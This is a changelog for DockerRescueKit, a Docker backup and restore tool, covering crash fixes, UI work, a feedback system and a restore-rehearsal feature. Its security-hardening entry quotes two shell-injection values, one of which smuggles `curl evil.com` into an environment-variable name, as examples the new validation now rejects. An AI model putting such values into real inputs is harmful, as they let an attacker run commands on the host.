# Changelog

All notable changes to DockerRescueKit will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/semver-spec/).

---

## [Unreleased]

---

## [1.2.4] - 2026-05-28

Merges UI/backend fixes worked on in parallel by Kilo Code with the
v1.2.2 NotificationDispatcher TDZ fix and v1.2.3 export/import work
already on `main`. v1.2.4 is the first v1.2.x image actually verified to
boot end-to-end inside Docker Desktop.

### Critical: how earlier v1.2.x images were broken

Two destructive bugs shipped together in the v1.2.0 / v1.2.1 / v1.2.2-pre
images on Hub. The combination of both made the Hub images
non-functional from 2026-05-14 through 2026-05-27:

- `packages/shared/package.json` declared `main: "./src/types.ts"` — Node
  cannot `require()` a TypeScript source. Crashed at startup with
  `Cannot find module ".../shared/src/types.ts"`. **Fixed in v1.2.2** by
  adding a real tsc build (`packages/shared/tsconfig.json`), changing
  `main`/`exports` to `./dist/types.js`, and having the Dockerfile build
  shared before backend.
- `NotificationDispatcher` constructor had
  `private logger: Logger = logger` — the parameter name shadowed the
  imported `logger` symbol in the default expression, triggering a TDZ
  `ReferenceError`. **Fixed in v1.2.2** by importing as `defaultLogger`.

Kilo Code's parallel work on the `slash-purpose` branch (forked off
`5a49418`, before the v1.2.2 fixes landed) shipped a `drk-extension:1.2.4`
sideload that fixed the UI bugs above but regressed both crash fixes —
that image crash-looped at startup.

### Cherry-picked from `slash-purpose` (Kilo Code)

- **Cost Analysis blank page fix** — `CostAnalysisPage.tsx` previously
  called `config.reduce(..., config[0])` for the recommendation section.
  When `config` came back empty (or the API returned a non-array), the
  reduce crashed during render and React unmounted the entire component
  tree → blank page. Fix: early-return with empty state, extract
  cheapest/fastest reduces into top-level variables, add `Array.isArray`
  guard on the API response.
- **Backup history 500** — `parseBackup` in `Database.ts` did
  `JSON.parse(r.targets)` and `JSON.parse(r.tags)` with no error
  handling. Malformed rows bubbled out as unhandled 500s. Fix: wrap
  each parse in `try/catch`, return `[]` for malformed columns.
- **Modal popup/dropdown cutoff** — `.modal-overlay` used
  `align-items: center` with fixed padding, and `.modal-body` had
  `overflow-x: hidden`. In small windows the modal extended below the
  viewport with no scrolling, and select dropdowns inside the body got
  clipped. Fix: `.modal-overlay` switched to `align-items: flex-start`
  with `padding: 40px 16px` and `overflow: auto`; `.modal-panel`
  `max-height: calc(100dvh - 80px)` with `flex-shrink: 0`;
  `.modal-body` `overflow: hidden auto`.
- **Wizard inline-style cleanup** — `RehearsalWizard`, `PolicyWizard`,
  and `PolicyDetail` had inline `alignItems: 'flex-start'` /
  `marginTop: 24` overrides on the overlay/panel that bypassed the CSS
  fixes above. Removed.

### Manually layered on top

- `GET /api/policies/:id/history` and `GET /api/backups` were the only
  history-shaped routes NOT wrapped in `asyncHandler`. Thrown errors
  bypassed the central error middleware → unhandled 500s. Both wrapped
  now.

### Dockerfile

- Root `package.json` declares
  `postinstall: "npm run build --workspace=@docker-rescue-kit/shared"`.
  The original Dockerfile only copied `packages/shared/package.json`
  before `npm ci`, so postinstall's `tsc` had no `.ts` source files and
  exited 1, breaking every fresh image build. Moved the full
  `COPY packages/shared/ ./packages/shared/` ahead of `npm ci`.

### Verified

- Standalone `docker run` with extension env vars: backend reaches
  `Service running on port 42880` + `[Scheduler] Engine initialized` and
  `/healthz` returns `{"status":"ok"}` within 35 s.
- Installed into Docker Desktop as `gozippy/dockerrescuekit:1.2.4`
  (canonical Hub name, NOT the `drk-extension` sideload tag) and shows
  `Running(1)`.

### Data-loss note for users

`docker extension rm` deletes the extension's named data volume. The
**volume name is derived from the extension's image ID**, so:

| Action | Result |
|---|---|
| Tag-to-tag update on same ID (`gozippy/dockerrescuekit:1.2.4` → `:1.2.5`) | Safe — Docker Desktop preserves the volume |
| ID changes (e.g. local sideload → Hub image) | Destructive — old volume orphaned then deleted |
| `docker extension rm` then re-install | Destructive — volume deleted |

Future Hub-tag updates on `gozippy/dockerrescuekit:*` are safe. v1.2.5
will add auto-export-on-boot, periodic timestamped snapshots, UI banner
+ one-click export, import-from-disk for recovery, and `docs/UPGRADE.md`
with manual volume-migration commands.

---

## [1.2.2] - 2026-05-27

In-product update awareness + structured feedback. After installing v1.2.1
users reported (a) external links in the version popover did nothing and
(b) there was no way to check whether a newer version was available without
leaving the extension. v1.2.2 fixes both and adds a first-class "Send
feedback" path so user pain reaches us without a GitHub round-trip.

### Critical fix

**Two independent startup crashes that shipped in v1.2.0 and v1.2.1**
made every Hub image in the v1.2 line non-functional. Anyone who pulled
`gozippy/dockerrescuekit:v1.2.0`, `:v1.2.1`, or `:latest` between
2026-05-14 and v1.2.2 was running an extension whose backend container
crash-looped at startup. The UI loaded, but every API call returned
"Offline" because the backend was never up.

**Crash #1 — shared package points main at `.ts` source.**
- `packages/shared/package.json` declared `main: "./src/types.ts"`, so
  Node tried to `require()` a TypeScript source at runtime →
  `Cannot find module '.../shared/src/types.ts'`.
- v1.1.0 was unaffected because every shared import was type-only and
  erased by tsc. v1.2 added `RehearsalService` which imports
  `SMOKE_CHECK_TEMPLATES` + `SCRUB_ENV_DEFAULT_PATTERNS` as runtime
  values, exposing the bug.
- Fix: `packages/shared` now has a `tsconfig.json` + real tsc build,
  `main`/`exports` point at `./dist/types.js`, the Dockerfile builds
  shared before backend, and `dist/` is copied into the final image.

**Crash #2 — TDZ self-shadow in `NotificationDispatcher` constructor.**
- The constructor default `private logger: Logger = logger` shadowed the
  imported module-scoped `logger` with the same-named parameter →
  `ReferenceError: Cannot access 'logger' before initialization` at
  every `new NotificationDispatcher(...)` call.
- Fix: import as `defaultLogger` so the parameter no longer shadows it.

**Verification**: rebuilt image, ran `docker run` with the extension's
exact env, container reaches `[Secrets] Initialized` AND continues past
service construction without an exception. Reinstalled into Docker
Desktop and `docker extension ls` reports `Running(1)`.

**Anyone on `:v1.2.0`, `:v1.2.1`, or `:latest` (which was tagged at
v1.2.1) before this release should upgrade to v1.2.2.**

### Added

- **Version badge popover overhaul** (`packages/extension/src/components/VersionBadge.tsx`)
  - "Check for updates" — polls Docker Hub tags API for the running image
    and surfaces an amber dot on the badge when a newer version is published.
  - "Open Marketplace" — deep-links to Docker Desktop's Marketplace tab
    via `ddClient.desktopUI.navigate('marketplace?extensionId=…')`.
  - "Copy diagnostics" — single click puts version + transport + data dir
    + user-agent on the clipboard for support tickets.
  - "Send feedback" — opens the new FeedbackModal.
  - **Bug fix**: external links (Release notes / Changelog / All versions)
    now use `ddClient.host.openExternal()` instead of `<a target="_blank">`.
    Plain anchors are blocked inside the Docker Desktop iframe — every link
    in the popover was dead before this release.
- **In-product feedback system**
  - New `FeedbackModal` with 5 types (Bug / Suggestion / Wish / Integration
    request / Question), 16k-char limit with live counter, optional screen-
    capture via `getDisplayMedia`, and a 6-entry static FAQ accordion above
    the form to deflect common questions.
  - Backend `POST /api/feedback` fans out to four sinks in parallel:
    - **local file** — `{dataDir}/feedback/{ts}-{type}-{id}.json` (always on)
    - **email** — uses the same nodemailer SMTP resolver as
      `NotificationService` (settings keys `smtp.host`/`smtp.port`/`smtp.user`/
      `smtp.pass`/`smtp.secure` + `email.from`, or `DRK_SMTP_*` env), sends
      to `gotadvantage@gmail.com` with the screenshot attached
    - **GitHub issue** — when `DRK_GITHUB_FEEDBACK_TOKEN` is set, opens an
      issue in `DRK_GITHUB_FEEDBACK_REPO` (default `gozippy/DockerRescueKit`)
      with `feedback` + type labels
    - **webhook** — POSTs to the URL stored under setting key
      `feedback.webhook_url` (Slack / Discord / n8n / Zapier all work)
  - `GET /api/feedback/config` returns boolean status of each sink so the
    UI can show which channels are live (no secrets in the response).
  - Each sink failure is caught + WARN-logged; one bad sink never blocks
    another.
- **Settings page rewrite** (`packages/extension/src/components/SettingsPage.tsx`)
  - Sections: About this install / Updates / Operations / Integrations /
    Danger zone. Sub-headings between groups.
  - **About card** — license tier pill (Free/Pro/Enterprise via
    `GET /api/license`), Docker Hub / GitHub / LICENSE links, build SHA
    + version readout.
  - **Updates card** — same Hub-tag poll as the popover, with "Check now",
    relative "last checked" timestamp, "Open Marketplace" button, and a
    changelog link.
  - **Notifications card** (Pro-gated) — UI for SMTP host/port/user/pass/
    secure + email.from + send-test (test endpoint stubbed for v1.2.3,
    button shows "Test send will land in v1.2.3" inline). Auto-saves on
    blur via existing `/api/settings/{key}`.
  - **Feedback Webhooks card** — text input for the webhook URL +
    "Send test ping" button that issues a real `submitFeedback` and renders
    the sinks breakdown inline.
  - Runtime card now shows backend uptime + Docker daemon status pill.
- **`/api/version/check` backend endpoint** — fetches Hub tags, finds the
  highest semver `vX.Y.Z`, compares to running `APP_VERSION`. Returns
  `{ current, latest, updateAvailable, checkedAt, hubError? }`. Network
  failures are reported, never thrown.
- **`utils/openExternal.ts`** — shared frontend helper exporting
  `openExternal(url)` + `openMarketplace(extensionId?)`. Uses ddClient in
  extension mode, `window.open` in browser/TCP mode.
- **`utils/appVersion.ts`** — extracted the package.json-walking
  `APP_VERSION` constant out of `index.ts` so both `/api/settings/meta`
  and `/api/version/check` read from the same source.

### Fixed

- **Displayed version no longer lies.** All three `package.json` files
  (root, backend, extension) are now bumped to 1.2.2 — previously the
  v1.2.0 and v1.2.1 releases shipped without bumping any of them, so the
  badge still said "v1.1.0" after a successful update. Future releases
  must bump these in lockstep with the git tag.
- Plain `<a target="_blank">` links inside the Docker Desktop iframe
  (silently no-op) are gone — every outbound link routes through
  `openExternal`.

### Environment

New env vars (all optional):
- `DRK_GITHUB_FEEDBACK_TOKEN` — PAT with `repo:public` scope for opening
  issues from `/api/feedback`.
- `DRK_GITHUB_FEEDBACK_REPO` — defaults to `gozippy/DockerRescueKit`.

---

## [1.2.0-rc.2] - 2026-05-25

Second release candidate of the v1.2 competitive-response sprint. Adds the
**restore-rehearsal workflow** — the single highest-leverage differentiator
identified in `docs/COMPETITIVE_ANALYSIS.md`. No tool in the OSS Docker
backup space ships end-to-end stack restore rehearsal; DRK now does.

### Added

**Restore-rehearsal workflow (R-1)** — see `docs/design/R-1_RESTORE_REHEARSAL.md`
- `RehearsalService` spins up an isolated bridge network (`Internal: true`,
  default subnet `172.31.255.0/24`), restores selected backups into temp
  volumes, brings up stand-in containers with the same image and scrubbed
  env, runs operator-supplied smoke checks, and tears down every resource
  it created. Teardown is guaranteed even on mid-run crash.
- 5 smoke-check runners: `http`, `exec`, `tcp`, `file_exists`,
  `sql_select_1` (postgres/mysql/mssql). Registry pattern — adding a new
  kind requires no edits to the service.
- Concurrency semaphore (default 2; override via `DRK_REHEARSAL_CONCURRENCY`).
- Orphan reaper runs at process start to clean resources labelled
  `com.gozippy.drk.rehearsal=<run-id>` whose run is not in-flight.
- Env scrub strips `*_TOKEN`, `*_SECRET`, `*_KEY`, `*_PASSWORD`, `AWS_*`,
  `STRIPE_*`, `LICENSE_*`, `OAUTH_*`, and `DATABASE_URL` from stand-in
  containers by default. Opt back in per-rehearsal via `options.allowEnvVars`.
- New shared types in `@docker-rescue-kit/shared`: `SmokeCheck`,
  `SmokeCheckResult`, `RehearsalRequest`, `RehearsalReport`,
  `RehearsalStatus`, `RehearsalStep`, `SCRUB_ENV_DEFAULT_PATTERNS`,
  `SMOKE_CHECK_TEMPLATES` (pre-made for the 6 stacks in `STACK_RECIPES.md`).
- New DB table `rehearsals` with policy index + started-desc index.
- REST surface:
  - `POST   /api/rehearsals`            — enqueue, 202 + `{ id, status: 'pending' }`
  - `GET    /api/rehearsals`            — list (`?policyId=&limit=`)
  - `GET    /api/rehearsals/:id`        — full `RehearsalReport`
  - `GET    /api/rehearsals/:id/stream` — Server-Sent Events
    (`event=hello|status|step|check|done`)
  - `POST   /api/rehearsals/:id/abort`  — signal cancel
  - `DELETE /api/rehearsals/:id`        — drop persisted record
- Audit events: `rehearsal.start`, `rehearsal.complete`, `rehearsal.abort`,
  `rehearsal.teardown_failed`.
- 31 new unit tests in `rehearsalService.test.ts` and `rehearsalRoutes.test.ts`
  (validation, env-scrub, registry shape, helper coverage, route status
  codes). Plus a gated integration test
  `integration/rehearsalService.real.test.ts` that exercises the real
  Docker daemon when `CI_INTEGRATION=1`.

**License compliance + positioning (parallel work bundled into this RC)**
- `COMPONENTS.md` — added `sidecars/` as Open Material; appended a
  classification audit log of every v1.2 file addition for LICENSE §22
  compliance.
- `docs/MARKETPLACE_LISTING_DRAFT.md` — status flipped DRAFT → READY TO
  PUBLISH. Locked categories (Databases & storage / Developer tools /
  Monitoring & observability). Incorporated SWOT findings inline and
  added a pricing/feature drift-watch table.

**Vertical side-car (V-1)** — `sidecars/plex/`
- First `gozippy/drk-plex` standalone side-car image. Bundles `restic +
  rclone + docker-cli + tini` in ~30MB Alpine layer. No DRK backend
  required — follows the `itzg/mc-backup` pattern (10M+ pulls from one
  vertical play). Supports local tarball, restic (s3/sftp/b2/azure), and
  rclone backends. Safe Plex quiesce: clears transcoder cache, optional
  `docker stop` with guaranteed restart via shell trap. Structured JSON
  logs ready for future DRK audit-log scraping.
- New top-level `sidecars/` directory classified Open in COMPONENTS.md so
  community contributions are unambiguously allowed.

**Design + planning docs**
- `docs/design/R-1_RESTORE_REHEARSAL.md` — full architecture spec authored
  before implementation; matches the code that landed in this RC.
- `.autoclaw/orchestrator/sprints/v1.2-launch.yaml` — 15-task sprint plan
  with owner assignments, acceptance criteria, and a quarterly watchlist.
  *(gitignored; not part of distribution)*

### Security hardening

- `passwordEnv` in `sql_select_1` smoke checks now validated against
  POSIX env-var name pattern (`/^[A-Za-z_][A-Za-z0-9_]*$/`) before being
  expanded as `$NAME` inside the driver CLI command. Rejects values like
  `PASS"; echo HACK; #` and `PASS$(curl evil.com)` that would break out
  of shell quoting. 6 new tests cover this. Surfaced by a static-analyser
  hit on an unrelated false-positive in a status-message string; the
  flagged string was reworded ("SELECT 1 returned" → "query returned")
  and the actual adjacent injection risk was fixed.
- Sandbox network created with `Internal: true` (no external routing).
- Stand-in containers receive no published ports, no shared networks, no
  Docker socket mount — security guarantees enforced regardless of what
  the source container had.

### Changed

- `packages/backend/src/index.ts` — wires the new `RehearsalService` into
  the `BackupService` constructor and mounts the routes module. One-line
  best-effort orphan reaper call on startup so a crashed run cleans up
  after itself on next boot.
- `packages/backend/src/db/Database.ts` — adds the `rehearsals` table to
  schema init + four CRUD helpers.

### Quality gates

- TypeScript clean across backend + shared + extension
- Jest: 210 passing, 5 skipped (3 pre-existing CI-gated integration tests
  + 2 new R-1 ones), 0 failing
- 43 net new tests in v1.2.0-rc.2 vs rc.1

### Known gaps still deferred to v1.2.1

- **R-2 restore-rehearsal UI wizard** (Kilo Code's scope) — backend
  endpoints are live; UI can mock against the shared types
- **N-1 notification delivery** (Slack / ntfy / email) — rehearsal audit
  events fire today; delivery wires in when N-1 lands
- **B-1 license-key + Free-tier gating** — license-server scaffolding
  exists; not yet enforcing the 5-policy or 1-concurrent-rehearsal caps
- **D-3-followup PolicyWizard step** for all 7 DB exporter kinds
- **Marketplace screenshots** `04-restore-browser.png`,
  `05-storage-vault.png` for the Verified Publisher packet — need a
  running app to capture

---

## [1.2.0-rc.1] - 2026-05-24

Competitive-response release driven by [docs/COMPETITIVE_ANALYSIS.md](docs/COMPETITIVE_ANALYSIS.md).
The Docker Desktop Extension Marketplace category for backup/restore is
effectively empty since Docker archived their own
`docker/volumes-backup-extension` on 2024-10-29. This release closes
the visible feature gap to `tiredofit/docker-db-backup` (DB-engine
parity) and adds positioning content vs. `offen/docker-volume-backup`,
`kopia`, `restic`, and `Duplicati`.

### Added

**Database exporters**
- **InfluxDB** (`{ kind: 'influxdb', version: 'v1' | 'v2', ... }`) — renders
  `influx backup` for v2 (token / org / bucket arguments) and
  `influxd backup -portable` for v1 (with optional `-db <name>`)
- **MSSQL** (`{ kind: 'mssql', db, server?, authMode?, user?, password?, outPath? }`)
  — emits `sqlcmd -Q "BACKUP DATABASE [db] TO DISK = N'...' WITH INIT"`
  with default Windows trusted auth (`-E`) or SQL auth (`-U`/`-P`).
  `WITH INIT` overwrites instead of appending so re-runs don't grow the
  `.bak`. `COMPRESSION` is intentionally omitted for SQL Server Express
  portability.
- Shared `DatabaseExporter` discriminated union in
  `@docker-rescue-kit/shared` updated to match.
- 8 new unit tests covering v1 + v2 InfluxDB paths and Windows-auth,
  SQL-auth, named-instance, and quote-escaping MSSQL paths.

**Documentation — SEO + positioning**
- New `docs/COMPETITIVE_ANALYSIS.md` — SWOT, gap analysis, and watchlist
  for the Docker backup/restore competitive surface
- New `docs/BACKUP_TOOLS_COMPARISON.md` — buyer's-guide comparison vs.
  `offen/docker-volume-backup`, `kopia`, `restic`, `Duplicati`, and
  `tiredofit/docker-db-backup` (linked from README)
- New `docs/STACK_RECIPES.md` — copy-paste DRK policies for Home
  Assistant, Plex/Jellyfin, Immich, Nextcloud, Vaultwarden, and n8n,
  each with pre/post hooks and restore notes

**Marketplace**
- `.autoclaw/internal/marketplace-submission.md` updated: tag bumped
  to `1.2.0`, license field corrected from "MIT" to
  "Source-available (Zippy Technologies Source-Available Commercial
  License v1.3)" per LICENSE §11.2/§11.3, Verified Publisher
  application track added with prerequisite/anti-criteria checklist
- README adds a "two pages to read first" callout pointing to the new
  comparison + recipes docs

**Coordination**
- v1.2 sprint plan filed at
  `.autoclaw/orchestrator/sprints/v1.2-launch.yaml` with P0/P1/P2/P3
  task IDs, owners, acceptance criteria, and a quarterly watchlist
- Cross-agent sprint kickoff and task-assignment messages delivered
  through `.autoclaw/orchestrator/comms/inboxes/`

### Known gaps deferred to v1.2.1

- **Wizard UI for DB exporters** — the new InfluxDB / MSSQL kinds are
  reachable via REST API and JSON-policy import, but no kind has a
  PolicyWizard step yet. Adding a "Database backups" step that covers
  all 7 kinds consistently is tracked as task D-3-followup.
- **Marketplace screenshots** — three of the five screenshots in the
  Verified Publisher packet (`04-restore-browser.png`,
  `05-storage-vault.png`) require a running app to capture; deferred
  pending a dedicated screenshot session.
- All P1 items (restore-rehearsal MVP, notification delivery,
  license-key validation) — tracked in the sprint plan.

---

## [1.1.0] - 2026-05-23

### Added

**Storage Vault — credentials-focused redesign**
- Storage Vault page now reads from `/api/connectors` (the actual AES-256-GCM-encrypted credential store) instead of projecting `policy.storage` blocks; local-filesystem mounts no longer appear here because they have no credentials to vault
- Each credential card shows owning policies, encrypted-field count, connector status, and a delete affordance with a "policies still reference this credential" warning
- New stat tiles: **Stored Credentials**, **Encryption: AES-256-GCM** (with live encrypted-field count), **Unused Credentials** (flags credentials not referenced by any policy)
- **Add Credential** button now opens the existing `AddConnectorWizard` — previously the button was inert and disabled
- Empty state with a single CTA when no credentials are saved yet

**Version label + controls (non-invasive)**
- Small `v<version>` chip in the sidebar footer (also in the mobile drawer) reading from `/api/settings/meta`
- Click-to-open popover with links to **Release notes**, **Changelog**, **All versions on Docker Hub**, and a shortcut to **Open Settings**
- Closes on outside-click or Escape; hidden when the sidebar is collapsed to icon-only

**Docker Desktop Extension — Dual-Transport Support (Phase 8)**
- Native Docker Desktop Extension integration via Unix socket transport (`DRK_TRANSPORT=socket`), in addition to the existing TCP path
- Extension UI now served inside Docker Desktop using the socket transport; standalone container deployments continue to use TCP (port 42880) unchanged
- Vite build flag `VITE_TRANSPORT=extension` sets relative `base` path (`./`) required for `file://` serving within Docker Desktop — TCP builds keep `/`
- `import.meta.env.VITE_TRANSPORT` injected at build time so the React UI can select the correct API transport at runtime
- Tailwind CSS via `@tailwindcss/vite` plugin added to the extension build

### Changed

- **Connectors page renamed to Integrations** in the sidebar nav, and trimmed to a marketplace + Rclone banner only. The duplicated "Active Connections" list is gone — Storage Vault is now the single source of truth for saved credentials
- `/api/settings/meta` now reports the backend's own `package.json` version rather than a hardcoded `'1.0.0'`; the lookup walks up from `__dirname` so it works in both dev (ts-node) and prod (compiled `dist/`) layouts
- Docker Hub image namespace updated to `gozippy` across all image tags, CI references, and documentation (`gozippy/dockerrescuekit`)
- CI/CD pipeline (`.github/workflows/docker.yml`) now builds **and pushes** both the standalone backend image (`gozippy/dockerrescuekit:standalone-*`) and the Docker Desktop Extension image (`gozippy/dockerrescuekit:*`) on `v*` tag pushes; previously only one image was published per release

### Fixed

- Storage Vault no longer shows duplicate "Local Mount" cards for policies that share the same default backup path. Local-filesystem destinations are now visible only through the **Backup Policies** page where they're actually owned
- `metadata.json` updated to satisfy Docker Desktop Marketplace validator requirements: correct icon reference (`drk-icon.svg`), UI tab definition with `root`/`src` fields, and `vm.composefile` pointing to `compose.yaml`

---

## [1.0.0] - 2026-05-11

First public release.

### Added

**WSL Security Updater (`tools/Update-All-WSL.ps1`)**
- Detects all installed WSL distros automatically, skipping Docker-managed distros (`docker-desktop`, `docker-desktop-data`)
- Multi-distro package manager detection: apt/apt-get (Ubuntu, Debian, Kali), dnf/yum (Fedora, RHEL, CentOS, AlmaLinux, Rocky), apk (Alpine), pacman (Arch, Manjaro), zypper (openSUSE)
- Repairs broken package states (interrupted dpkg/apt transactions) before updating
- Per-distro reporting: running kernel version, newest installed kernel, held packages, remaining upgradable packages, reboot-required flag, disk usage before and after
- Automatic retry with WSL reset for transient `HCS_E_CONNECTION_TIMEOUT` failures (common on machines without nested virtualization support)
- Full timestamped log file with per-distro output and final summary
- Parameters: `-LogDir`, `-SkipDockerImages`, `-ForceDockerAll`, `-DryRun`, `-DistroFilter`, `-MaxRetries`, `-RetryDelaySec`, `-AutoElevate`
- Null-byte stripping for WSL UTF-16 LE output on Windows
- PATH translation warning filter (WSL nested virtualization messages demoted to DEBUG)
- WSL engine self-update before distro updates
- Final summary grouped by SUCCESS / FAILED / UNSUPPORTED with actionable tips for failures

**Smart Docker Image Updater (`tools/Invoke-DockerUpdateSafe.ps1`)**
- Image classification engine: LOCAL (no registry digest, skip), PRIVATE (IP/localhost registry, skip), FLOATING (latest/main/edge/etc.), PINNED (version tag), STANDARD
- Built-in security priority list covering 30+ high-CVE repository families (nginx, postgres, redis, node, alpine, ubuntu, debian, python, golang, and more)
- Compose project detection: scans common project directories up to 4 levels deep for `docker-compose.yml` / `compose.yaml` and groups images by project
- Interactive consent menu: security-flagged only, all floating, all pullable, by compose project, custom numbered selection, or skip
- Non-interactive / scheduled task mode: auto-detects `[Environment]::UserInteractive` and falls back to security-only with no prompting
- Post-pull check: identifies running containers whose image was just updated and warns that a restart is needed
- Checkpoint integration: always calls `New-DockerCheckpoint.ps1` before pulling (unless `-SkipCheckpoint`)
- Parameters: `-LogFile`, `-CheckpointDir`, `-DryRun`, `-SecurityOnly`, `-ForceAll`, `-ApproveImages`, `-SkipCheckpoint`

**Rollback Checkpoint (`tools/New-DockerCheckpoint.ps1`)**
- Captures registry digest (`sha256`) for every local image using `docker images --digests` (single fast call, no per-image inspect loop)
- Saves full `docker inspect` snapshot of all containers in a single call
- Generates `Restore-Images.ps1`: a standalone rollback script that pulls each image back to its exact prior digest using `docker pull repo@sha256:...`
- Documents locally-built images (no registry digest) separately with a clear rebuild-from-source note
- Writes `CHECKPOINT_META.json` with timestamp, counts, and restorable vs local-only breakdown
- Parameters: `-CheckpointDir`, `-LogFile`
- Returns checkpoint directory path for use by parent scripts

**Double-click Launcher (`tools/Run-WSL-Updater.bat`)**
- Self-elevating UAC launcher requiring no PowerShell knowledge
- Checks for script existence before launching with a clear error message if missing
- Keeps console window open after completion

**Full Backup (`backup-docker-snapshot.ps1`)**
- Complete point-in-time Docker environment backup: containers, images (saved as .tar), volumes, networks, daemon settings
- Commits running containers as snapshot images before export
- Generates `restore-docker-snapshot.ps1` with full restore instructions
- Parameters: `-BackupPath`, `-BackupName`

**Backup Scheduler (`setup-backup-schedule.ps1`)**
- Registers a Windows Scheduled Task for automated full backups
- Parameters: `-BackupPath`, `-ScriptPath`, `-Schedule`, `-Time`

**Documentation**
- `README.md`: quick-start, requirements, script overview, scheduling guide
- `docs/SCRIPTS.md`: full parameter reference for all scripts
- `ARTICLE.md`: security write-up covering Copy Fail (CVE-2026-31431), Dirty Frag (CVE-2026-43284/43500), and cPanel CVE-2026-41940
- `CONTRIBUTING.md`: contribution guidelines
- `CHANGELOG.md`: this file

### Security

- All PowerShell scripts use ASCII-only characters in executable string literals for compatibility with PowerShell 5.1's CP1252 file encoding (prevents corruption of Unicode characters)
- No credentials, API keys, or personal data in any committed file
- `.gitignore` excludes `.env`, `.local-data/`, log directories, checkpoint archives, and private AI agent configuration
- Docker image updates require explicit user consent before pulling in interactive mode
- Rollback checkpoint is always saved before any image is pulled

### Known Limitations

- WSL distros requiring systemd (Ubuntu 22.04 with default `wsl.conf`) may time out when launched non-interactively on hardware without nested virtualization support. Workaround: set `systemd=false` in `/etc/wsl.conf` inside the affected distro, or update it manually.
- Locally-built Docker images (no registry) cannot be updated or restored via digest — by design.
- Private registries using plain HTTP require `"insecure-registries"` configured in Docker daemon settings for pulls to succeed.
- Compose project names derived from parent directory names may appear as hash strings if Docker Desktop uses temporary directories for compose projects.
